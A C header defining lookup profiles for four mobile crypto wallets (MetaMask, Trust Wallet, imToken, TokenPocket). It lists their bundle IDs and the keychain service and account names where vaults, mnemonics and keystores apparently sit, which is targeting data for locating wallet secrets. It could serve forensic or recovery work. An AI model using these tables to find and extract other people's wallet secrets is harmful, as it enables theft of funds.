#ifndef WALLET_PROFILES_H
#define WALLET_PROFILES_H

#include <stddef.h>

typedef struct {
    const char *id;
    const char *label;
    const char *bundle;
    const char **services;
    size_t service_count;
    const char **accounts;
    size_t account_count;
    const char **keywords;
    size_t keyword_count;
} WalletAppProfile;

static const char *kMetaMaskServices[] = {
    "com.metamask", "MetaMask", "io.metamask.MetaMask", "RN_KEYCHAIN_DEFAULT_SERVICE", "metamask-vault"
};
static const char *kMetaMaskAccounts[] = { "", "data", "vault", "persist:root", "keyring" };
static const char *kMetaMaskKeywords[] = { "metamask", "io.metamask", "fox", "keyring", "vault" };

static const char *kTrustServices[] = {
    "com.sixdays.trust", "TrustWallet", "trust.wallet", "trust:wallet", "TW"
};
static const char *kTrustAccounts[] = { "", "wallet", "mnemonic", "default" };
static const char *kTrustKeywords[] = { "trust", "sixdays", "tw.wallet", "multiwallet" };

static const char *kImTokenServices[] = {
    "im.token.app", "imToken", "imtoken.wallet", "imtoken.keychain", "keychain"
};
static const char *kImTokenAccounts[] = { "", "wallet", "identity", "keystore" };
static const char *kImTokenKeywords[] = { "imtoken", "im.token", "tokenlon" };

static const char *kTokenPocketServices[] = {
    "com.tokenpocket.pro", "TokenPocket", "tp.wallet", "tokenpocket.key", "TPWallet"
};
static const char *kTokenPocketAccounts[] = { "", "wallet", "keystore", "default" };
static const char *kTokenPocketKeywords[] = { "tokenpocket", "tp.wallet", "tpocket" };

static WalletAppProfile kWalletProfiles[] = {
    { "metamask", "MetaMask", "io.metamask.MetaMask",
      kMetaMaskServices, sizeof(kMetaMaskServices)/sizeof(kMetaMaskServices[0]),
      kMetaMaskAccounts, sizeof(kMetaMaskAccounts)/sizeof(kMetaMaskAccounts[0]),
      kMetaMaskKeywords, sizeof(kMetaMaskKeywords)/sizeof(kMetaMaskKeywords[0]) },
    { "trust", "Trust Wallet", "com.sixdays.trust",
      kTrustServices, sizeof(kTrustServices)/sizeof(kTrustServices[0]),
      kTrustAccounts, sizeof(kTrustAccounts)/sizeof(kTrustAccounts[0]),
      kTrustKeywords, sizeof(kTrustKeywords)/sizeof(kTrustKeywords[0]) },
    { "imtoken", "imToken", "im.token.app",
      kImTokenServices, sizeof(kImTokenServices)/sizeof(kImTokenServices[0]),
      kImTokenAccounts, sizeof(kImTokenAccounts)/sizeof(kImTokenAccounts[0]),
      kImTokenKeywords, sizeof(kImTokenKeywords)/sizeof(kImTokenKeywords[0]) },
    { "tokenpocket", "TokenPocket", "com.tokenpocket.pro",
      kTokenPocketServices, sizeof(kTokenPocketServices)/sizeof(kTokenPocketServices[0]),
      kTokenPocketAccounts, sizeof(kTokenPocketAccounts)/sizeof(kTokenPocketAccounts[0]),
      kTokenPocketKeywords, sizeof(kTokenPocketKeywords)/sizeof(kTokenPocketKeywords[0]) },
};

static const size_t kWalletProfileCount = sizeof(kWalletProfiles)/sizeof(kWalletProfiles[0]);

#endif
